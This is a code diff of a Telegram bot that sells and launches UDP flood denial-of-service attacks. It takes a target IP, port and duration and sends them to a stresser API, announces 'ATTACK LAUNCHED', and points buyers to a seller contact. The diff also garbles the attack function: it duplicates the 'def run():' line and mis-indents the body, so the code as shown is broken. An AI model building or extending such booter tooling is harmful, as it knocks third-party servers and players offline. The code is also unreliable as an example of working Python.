@@ -920,42 +920,43 @@ def attack(msg):
     bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n📊 Total active slots: {new_total}/{MAX_CONCURRENT}")
     
     def run():
-        retry = 0
-        while retry < 3:
-            try:
-                api_params = {
-                    "api_key": API_KEY,
-                    "target": ip,
-                    "port": port,
-                    "time": duration,
-                    "concurrent": 1,
-                    "method": "udp"
-                }
-                
-                 response = requests.get(API_URL, params=api_params, timeout=10)
-                
-                if response.status_code == 200:
-                    time.sleep(duration)
-                    bot.send_message(msg.chat.id, f"✅ ATTACK FINISHED!\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔄 Restart your game!")
-                    break
-                else:
-                    retry += 1
-                    if retry < 3:
-                        time.sleep(2)
-                        continue
-                    bot.send_message(msg.chat.id, f"❌ Attack failed!\n\n🛒 Contact: XSILENT")
-                    
-            except Exception as e:
+    def run():
+    retry = 0
+    while retry < 3:
+        try:
+            api_params = {
+                "api_key": API_KEY,
+                "target": ip,
+                "port": port,
+                "time": duration,
+                "concurrent": 1,
+                "method": "udp"
+            }
+            
+            response = requests.get(API_URL, params=api_params, timeout=10)
+            
+            if response.status_code == 200:
+                time.sleep(duration)
+                bot.send_message(msg.chat.id, f"✅ ATTACK FINISHED!\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔄 Restart your game!")
+                break
+            else:
                 retry += 1
                 if retry < 3:
                     time.sleep(2)
                     continue
-                bot.send_message(msg.chat.id, f"❌ Attack failed! API offline.\n\n🛒 Contact: XSILENT")
-        
-        if attack_id in active_attacks:
-            del active_attacks[attack_id]
+                bot.send_message(msg.chat.id, f"❌ Attack failed!\n\n🛒 Contact: XSILENT")
+                
+        except Exception as e:
+            retry += 1
+            if retry < 3:
+                time.sleep(2)
+                continue
+            bot.send_message(msg.chat.id, f"❌ Attack failed! API offline.\n\n🛒 Contact: XSILENT")
     
-    threading.Thread(target=run).start()
+    if attack_id in active_attacks:
+        del active_attacks[attack_id]
+
+threading.Thread(target=run).start()
 
 @bot.message_handler(commands=['status'])
 def status(msg):
